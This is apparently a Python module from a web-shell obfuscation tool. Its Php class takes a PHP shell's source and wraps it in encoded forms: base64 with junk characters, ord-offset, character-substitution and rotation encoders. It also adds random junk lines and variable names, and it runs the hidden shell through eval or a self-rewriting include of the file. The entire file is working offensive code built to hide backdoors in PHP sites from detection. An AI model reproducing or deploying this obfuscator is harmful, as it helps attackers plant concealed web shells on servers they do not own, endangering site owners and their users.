#! /usr/bin/python

from shell import Shell  
from util import Encoders, Junk, PhpParser 


class Php(Shell): 
	
	php_reserved = [ 
		'$GLOBALS', '$_SERVER', '$_REQUEST', '$_POST', '$_GET', 
		'$_FILES', '$_ENV', '$_COOKIE', '$_SESSION', 
		'$argc', '$argv', '$this->' 
	] 
	
	def __init__(self, path = None):
		Shell.__init__(self, 'php')
		self.shell_path = self.Path.php if path is None else path
		self.shell_text = self.Read(self.shell_path)
	
	def Encode(self, encoding): 
		encoders = { 
			'b64':self.Base64, 'ord':self.OrdPlus, 
			'rnd':self.Random, 'rot':self.RotPlus 
		}
		return encoders[encoding]() if encoders.get(encoding) else None
	
	def Create(self, payload, add_junk = False): 
		shell = self.Execution(payload) 
		if add_junk : 
			shell = '\n'.join( 
				'\n'.join( 
					[ line ] + [ Junk().Php(['$'+self.makeVars() for _ in range(4)], 'str') 
						for _ in range(self.rndInt(0,2)) ]
				) for line in shell.splitlines()
			) + ' \n'
		shell = '<?php \n' + shell +  '?>' 
		return shell
	
	def Base64(self): 
		shell_encoded = Encoders(self.shell_text).Base64()
		junk = self.makeJunk(shell_encoded + 'base64_decode', self.an_chars) 
		vals = self.makeVals(shell_encoded, junk)
		self.vars += [ '$' + self.makeVars() for _ in range(4) ]
		
		b64 = junk.join([ c for c in '"base64_decode"' ])
		payload = self.vars[0] + ' = ""; \n' 
		payload += ''.join([ self.vars[0] + ' .= "' + v + '"; \n' for v in vals ])
		payload += self.vars[1] + ' = str_replace( "' + junk + '", "", ' + self.vars[0] + ' ); \n' 
		payload += self.vars[2] + ' = str_replace( "' + junk + '", "", ' + b64 + ' ); \n' 
		payload += self.vars[3] + ' = ' + self.vars[2] + '( ' + self.vars[1] + ' ); \n' 
		return payload
	
	def OrdPlus(self): 
		shell_encoded, ord_plus, chr_join = Encoders(self.shell_text).OrdPlus()
		vals = self.makeVals(shell_encoded)
		self.vars = [ '$' + self.makeVars() for _ in range(3) ]
		
		payload = self.vars[2] + ' = ""; \n'
		payload += self.vars[0] + ' = ""; \n' 
		payload += ''.join([ self.vars[0] + ' .= "' + v + '"; \n' for v in vals ]) 
		payload += 'foreach(explode("' + chr_join + '", ' + self.vars[0] + ') as ' + self.vars[1] + ') ' 
		payload +=  self.vars[2] + ' .= chr(' + self.vars[1] + ' - ' + str(ord_plus) + '); \n' 
		return payload
	
	def Random(self): 
		clean_str = lambda s : s.encode('unicode-escape').replace('"', '\\"').replace("$", "\\$")
		shell_encoded, cs1, cs2 = Encoders(self.shell_text).Random()
		vals = self.makeVals(shell_encoded)
		self.vars = [ '$' + self.makeVars() for _ in range(4) ]
		
		payload = self.vars[3] + ' = ""; \n' 
		payload += self.vars[0] + ' = ""; \n' 
		payload += ''.join([ self.vars[0] + ' .= "' + clean_str(v) + '"; \n' for v in vals ]) 
		payload += self.vars[1] + ' = "' + clean_str(cs1) + '"; \n' 
		payload += self.vars[2] + ' = "' + clean_str(cs2) + '"; \n' 
		payload += 'foreach(str_split(' + self.vars[0] + ') as $c) { ' 
		payload += self.vars[3] + ' .= (strpos(' + self.vars[2] + ', $c) === false) ? $c : ' 
		payload += self.vars[1] + '[strpos(' + self.vars[2] + ', $c)]; } \n' 
		return payload
	
	def RotPlus(self): 
		clean_str = lambda s : s.encode('unicode-escape').replace('"', '\\"').replace("$", "\\$")
		shell_encoded, rows = Encoders(self.shell_text).Rot90()
		vals = self.makeVals(shell_encoded)
		self.vars = [ '$' + self.makeVars() for _ in range(4) ]
		
		payload = self.vars[1] + ' = ' + str(rows) + '; \n' 
		payload += self.vars[2] + ' = array(); \n' 
		payload += self.vars[0] + ' = "" ; \n' 
		payload += ''.join([ self.vars[0] + ' .= "' + clean_str(v) + '"; \n' for v in vals ]) 
		payload += 'for($i = 0; $i < ' + self.vars[1] + '; $i++) ' + self.vars[2] + '[] = ""; \n' 
		payload += 'for($i = 0; $i < (strlen(' + self.vars[0] + ') / ' + self.vars[1] + '); $i++) '  
		payload += '{ for($r = 0; $r < ' + self.vars[1] + '; $r++) ' 
		payload +=  self.vars[2] + '[$r] .= ' + self.vars[0] + '[$r + $i * ' + self.vars[1] + ']; } \n' 
		payload += self.vars[3] + ' = trim(implode("", ' + self.vars[2] + ')); \n' 
		return payload
	
	def Execution(self, code, method = 'eval'): 
		if method == 'eval' : 
			payload  = code 
			payload += self.vars[-1] + ' = "?>' + self.vars[-1] + '"; \n'
			payload += 'eval( ' + self.vars[-1] + ' ); \n' 
		else : 
			self.vars += [ '$' + self.makeVars() for _ in range(2) ]
			payload = self.vars[-2] + ' = __file__; \n' 
			payload += self.vars[-1] + ' = file_get_contents(' + self.vars[-2] + '); \n' 
			payload += code 
			payload += 'file_put_contents( ' + self.vars[-2] + ', ' + self.vars[-3] + ' ); \n' 
			payload += 'include( ' + self.vars[-2] + ' ); \n' 
			payload += 'file_put_contents( ' + self.vars[-2] + ', ' + self.vars[-1] + ' ); \n' 
		return payload

